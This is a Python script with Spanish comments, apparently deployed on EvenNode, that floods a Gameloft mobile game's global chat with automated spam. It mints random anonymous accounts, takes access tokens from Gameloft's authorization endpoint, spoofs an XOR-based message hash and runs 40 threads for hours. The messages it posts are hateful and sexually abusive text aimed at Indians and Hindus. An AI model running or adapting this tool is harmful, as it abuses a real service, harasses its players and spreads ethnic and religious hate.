# app.py - Archivo PRINCIPAL para EvenNode
import requests
import time
import random
import string
import threading
import json
from urllib.parse import urlparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_credentials():
    """Genera credenciales aleatorias"""
    username = f'anonymous:{"".join(random.choices(string.ascii_letters + string.digits, k=random.randint(9, 12)))}'
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 40)))
    device_id = str(random.randint(1000000000, 9999999999))
    
    return {
        "username": username,
        "password": password,
        "device_id": device_id
    }

class AdvancedMultiURLSpam:
    def __init__(self):
        self.token_url = "https://eur-janus.gameloft.com/authorize"
        self.subscribe_url = "https://eur-arion.gameloft.com/chat/channels/mc5_global/subscribe"
        
        # Sistema de múltiples URLs
        self.active_urls = []
        self.url_lock = threading.Lock()
        self.max_urls = 10
        
        # Credenciales dinámicas
        creds = generate_random_credentials()
        self.current_credentials = {
            'anon_id': creds['username'],
            'password': creds['password'],
            'device_id': creds['device_id']
        }
        self.xor_key = "1961151304ELF"
        
        # Control de ejecución
        self.active = False
        self.sent_count = 0
        self.failed_count = 0
        
        # Temporizador de URLs
        self.last_url_update = 0
        self.url_update_interval = 120
        
        # Estadísticas
        self.url_stats = {}
        self.last_display_update = 0
        self.display_interval = 5
        
        # Pool de sesiones
        self.sessions_pool = []
        for _ in range(20):
            session = requests.Session()
            session.verify = False
            session.timeout = 3
            self.sessions_pool.append(session)
    
    def _obtener_nueva_url(self):
        """Obtiene una nueva URL dinámica"""
        try:
            session = random.choice(self.sessions_pool)
            
            # Obtener token
            payload = {
                'client_id': "1924:56128:6.0.6a:android:googleplay",
                'username': self.current_credentials['anon_id'],
                'password': self.current_credentials['password'],
                'scope': "alert auth chat leaderboard_ro lobby message session social",
                'device_id': self.current_credentials['device_id'],
                'for_credential_type': "anonymous",
                'device_country': "US",
                'device_language': "en",
                'device_model': "TECNO+BG6",
                'device_resolution': "1612x720"
            }
            
            response = session.post(self.token_url, data=payload, timeout=5)
            if response.status_code != 200:
                return None
            
            data = response.json()
            token = data.get('access_token')
            fed_id = data.get('fed_id')
            
            if not token or not fed_id:
                return None
            
            # Obtener URL del chat
            chat_payload = {'language': 'en', 'access_token': token}
            chat_response = session.post(self.subscribe_url, data=chat_payload, timeout=5)
            if chat_response.status_code != 200:
                return None
            
            chat_data = chat_response.json()
            chat_url = chat_data.get('cmd_url', '')
            
            if not chat_url:
                return None
            
            url_data = {
                'url': chat_url,
                'token': token,
                'fed_id': fed_id,
                'last_used': time.time(),
                'created_at': time.time()
            }
            
            with self.url_lock:
                if len(self.active_urls) >= self.max_urls:
                    old_url = self.active_urls.pop(0)
                    if old_url['url'] in self.url_stats:
                        del self.url_stats[old_url['url']]
                
                self.url_stats[chat_url] = {"sent": 0, "failed": 0}
                self.active_urls.append(url_data)
            
            return url_data
            
        except:
            return None
    
    def obtener_url_activa(self):
        """Obtiene una URL activa de forma balanceada"""
        with self.url_lock:
            if not self.active_urls:
                return None
            
            # Ordenar por última vez usada (las más viejas primero)
            self.active_urls.sort(key=lambda x: x['last_used'])
            
            # Tomar la más antigua
            url_data = self.active_urls[0]
            url_data['last_used'] = time.time()
            
            return url_data
    
    def generar_hash_xor(self, nickname):
        """Genera hash XOR rápido"""
        result_chars = []
        for i in range(len(nickname)):
            key_char = self.xor_key[i % len(self.xor_key)]
            result_char = chr(ord(nickname[i]) ^ ord(key_char))
            result_chars.append(result_char)
        return ''.join(result_chars)
    
    def generar_nickname_rapido(self):
        """Genera nickname rápido"""
        bases = ["1", "a", "3", "r", "j", "p", "b", "h"]
        return f"{random.choice(bases)}{random.randint(1000, 9999)}"
    
    def generar_mensaje_rapido(self):
        """Genera mensaje rápido"""
        bases = [
            "HINDUS BHAILOG EAT COW MEAT TODAY. KILL THE MORTAL COW AND EAT BEAF BURGER TODAY HAHAHA JAY SHREE RAAM.",
            "AS AN INDIAN YOU MUST DRINK COW U__R_I__N BEFORE BED AND EAT COW BULL SH*i*T AT BREAKFAST",
            "SHAMANG WILL FK YALL INDIAN MOM JAY SHREE RAAM",
            "INDIANS ARE NOT BLACK... INDIANS ARE WHITE PEOPLE AND BRAHMAN IS THE NUMBER ONE RACE OF THIS WORLD HAHAHAHAHAHAHAHAHA.",
            "MODI IS OUR NATIONAL GOD OF INDIA WHO USED TO SELL TEA AND BHAGBAN MADE HIM OUR PM TO ALLOW US R,,A,,P,,E.",
            "LODA LEGENS INSIDE YOUR MOM AS,S AHAHAH",
            "Lets fk yall indian ahahahhaha",
            "Great mom ahaha lets fk her a,s,s ahahahah",
            "JAY SHREE RAAM",
            "JAY SHREE RAAM",
            "JAY SHREE RAAM",
            "SHAMANG THE KING JAY SHREE RAAM",
            "JAY SHREE RAAM",
            "EVERY INDIAN WOMEN MUST F**K THE B*J*P MEMBER TO BE AN INDIAN TRADITIONAL WOMEN HAHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHAHAHA."
        ]
        return f"{random.choice(bases)} {random.randint(1, 999)}"
    
    def enviar_mensaje_worker(self):
        """Worker para enviar mensajes usando múltiples URLs"""
        if not self.active:
            return

        try:
            # Obtener URL activa
            url_data = self.obtener_url_activa()
            if not url_data:
                self.failed_count += 1
                return

            # Generar datos únicos
            nickname = self.generar_nickname_rapido()
            mensaje = self.generar_mensaje_rapido()
            hash_xor = self.generar_hash_xor(nickname)
            timestamp = str(int(time.time()))
            
            # Extraer host de la URL
            parsed = urlparse(url_data['url'])
            host_chat = parsed.netloc

            # Payload ultra-rápido
            payload = {
                '_killSignColor': "16777215",
                '_messageType': "-1",
                '_fedId': f"fed_id:{url_data['fed_id']}",
                '_senderTimestamp': timestamp,
                '_senderName': nickname,
                '_anonId': self.current_credentials['anon_id'],
                '_killSign': "gameloft",
                '_': hash_xor,
                'msg': mensaje,
                'user': json.dumps({"nickname": nickname}),
                'access_token': url_data['token']
            }

            headers = {
                'Host': host_chat,
                'User-Agent': "ChatLibv2"
            }

            # Envío ultra-rápido
            session = random.choice(self.sessions_pool)
            response = session.post(
                url_data['url'], 
                data=payload, 
                headers=headers,
                timeout=2,
                verify=False
            )

            if response.status_code == 200:
                self.sent_count += 1
                # Actualizar estadísticas de URL
                with self.url_lock:
                    if url_data['url'] in self.url_stats:
                        self.url_stats[url_data['url']]["sent"] += 1
            else:
                self.failed_count += 1
                # Actualizar estadísticas de URL
                with self.url_lock:
                    if url_data['url'] in self.url_stats:
                        self.url_stats[url_data['url']]["failed"] += 1

        except:
            self.failed_count += 1
    
    def mostrar_estadisticas(self, elapsed_time, total_time):
        """Muestra estadísticas en tiempo real"""
        current_time = time.time()
        if current_time - self.last_display_update >= self.display_interval:
            self.last_display_update = current_time
            
            # Calcular velocidad
            speed = self.sent_count / elapsed_time if elapsed_time > 0 else 0
            remaining = total_time - elapsed_time
            
            # Limpiar línea anterior
            print('\r' + ' ' * 100, end='\r')
            
            # Mostrar estadísticas principales
            print(f"\r⏱️ {int(elapsed_time)}s | ✅ {self.sent_count} | ❌ {self.failed_count} | 🚀 {speed:.1f}/s | ⏳ {int(remaining)}s", end='')
            
            # Mostrar URLs activas cada 30 segundos
            if int(elapsed_time) % 30 == 0:
                print(f"\n{'='*60}")
                print("🌐 URLs ACTIVAS:")
                with self.url_lock:
                    for i, url_data in enumerate(self.active_urls):
                        url_short = url_data['url'][:50] + "..." if len(url_data['url']) > 50 else url_data['url']
                        stats = self.url_stats.get(url_data['url'], {"sent": 0, "failed": 0})
                        age = int(current_time - url_data['created_at'])
                        print(f"  {i+1}. {url_short}")
                        print(f"     📊 Enviados: {stats['sent']} | Fallidos: {stats['failed']} | Edad: {age}s")
                print('='*60)
                print(f"\r⏱️ {int(elapsed_time)}s | ✅ {self.sent_count} | ❌ {self.failed_count} | 🚀 {speed:.1f}/s | ⏳ {int(remaining)}s", end='')
    
    def update_urls_if_needed(self):
        """Actualiza URLs cada 2 minutos"""
        current_time = time.time()
        if current_time - self.last_url_update >= self.url_update_interval:
            self.last_url_update = current_time
            return self._obtener_nueva_url()
        return None
    
    def url_maintenance_worker(self):
        """Worker que mantiene URLs actualizadas"""
        while self.active:
            # Actualizar URLs cada 2 minutos
            new_url = self.update_urls_if_needed()
            if new_url:
                print(f"\n🔄 Nueva URL añadida: {new_url['url'][:50]}...")
            
            # También crear nuevas URLs si tenemos pocas
            with self.url_lock:
                if len(self.active_urls) < 3:
                    self._obtener_nueva_url()
            
            time.sleep(10)
    
    def spam_continuo_automatico(self, duracion=30000, workers=40):
        """Spam continuo automático con múltiples URLs"""
        print(f"🚀 INICIANDO SPAM AUTOMÁTICO CON MÚLTIPLES URLs")
        print("=" * 60)
        print(f"⏱️  Duración: {duracion} segundos ({duracion/3600:.1f} horas)")
        print(f"👷 Workers: {workers}")
        print(f"🌐 URLs simultáneas: Máximo {self.max_urls}")
        print(f"🔄 Actualización URLs: Cada {self.url_update_interval/60} minutos")
        print("=" * 60)
        print("Iniciando en 3 segundos...")
        
        time.sleep(3)
        
        self.active = True
        self.sent_count = 0
        self.failed_count = 0
        
        # Obtener URLs iniciales
        print("\n🔍 Obteniendo URLs iniciales...")
        for i in range(3):
            url_data = self._obtener_nueva_url()
            if url_data:
                print(f"  ✅ URL {i+1}: {url_data['url'][:50]}...")
            else:
                print(f"  ❌ URL {i+1}: Falló al obtener")
        
        # Verificar si tenemos al menos 1 URL
        with self.url_lock:
            if len(self.active_urls) == 0:
                print("\n❌ ERROR: No se pudo obtener ninguna URL")
                print("   Posibles causas:")
                print("   1. Servidor bloquea las peticiones")
                print("   2. Credenciales inválidas")
                print("   3. Endpoint incorrecto")
                return
        
        # Iniciar worker de mantenimiento de URLs
        url_thread = threading.Thread(target=self.url_maintenance_worker, daemon=True)
        url_thread.start()
        
        # Función para workers continuos
        def worker_continuo():
            while self.active and (time.time() - start_time) < duracion:
                self.enviar_mensaje_worker()

        # Crear workers de spam
        start_time = time.time()
        threads = []
        for i in range(workers):
            thread = threading.Thread(target=worker_continuo)
            threads.append(thread)
            thread.start()
        
        print(f"\n✅ {workers} workers iniciados")
        print("📊 Iniciando envío...\n")

        # Bucle principal con visualización
        while self.active and (time.time() - start_time) < duracion:
            elapsed_time = time.time() - start_time
            self.mostrar_estadisticas(elapsed_time, duracion)
            time.sleep(0.5)

        # Finalizar
        self.active = False
        for thread in threads:
            thread.join()
        
        time.sleep(2)
        
        # Mostrar estadísticas finales
        total_sent = self.sent_count
        total_failed = self.failed_count
        total_attempts = total_sent + total_failed
        
        success_rate = (total_sent / total_attempts * 100) if total_attempts > 0 else 0
        speed = total_sent / duracion if duracion > 0 else 0
        
        print("\n\n" + "=" * 80)
        print("🎉 SPAM AUTOMÁTICO COMPLETADO")
        print(f"📊 RESUMEN: ✅ {total_sent} | ❌ {total_failed} | 🎯 {success_rate:.1f}%")
        print(f"🚀 Velocidad: {speed:.2f} msg/s | ⏱️  Tiempo: {duracion}s")
        
        with self.url_lock:
            print(f"🌐 URLs utilizadas: {len(self.active_urls)}")
            
            if self.active_urls:
                print("\n📈 Estadísticas por URL:")
                for i, url_data in enumerate(self.active_urls):
                    stats = self.url_stats.get(url_data['url'], {"sent": 0, "failed": 0})
                    print(f"  URL {i+1}: ✅ {stats['sent']} | ❌ {stats['failed']}")
        
        print("=" * 80)

if __name__ == "__main__":
    print("="*60)
    print("🚀 INICIANDO SCRIPT EN EVENNODE")
    print("="*60)
    
    spam = AdvancedMultiURLSpam()
    
    # Configuración automática
    duracion = 30000  # 30,000 segundos
    workers = 40      # 40 workers
    
    print(f"⏱️  Duración: {duracion} segundos")
    print(f"👷 Workers: {workers}")
    print("="*60)
    
    # Ejecutar
    spam.spam_continuo_automatico(duracion, workers)
